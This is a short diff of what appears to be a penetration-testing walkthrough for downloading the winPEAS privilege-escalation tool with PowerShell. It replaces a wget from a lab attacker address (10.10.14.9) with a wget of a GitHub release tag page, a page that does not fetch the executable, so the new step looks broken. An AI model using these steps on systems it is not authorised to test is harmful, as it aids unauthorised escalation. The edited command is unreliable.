@@ -12,7 +12,7 @@ Example:
 
 1. First, download it using PowerShell:
 ````bash
-wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
+wget https://github.com/carlospolop/PEASS-ng/releases/tag/20231002-59c6f6e6
 ````
 2.  Switch to PowerShell in your terminal: 
 ````bash
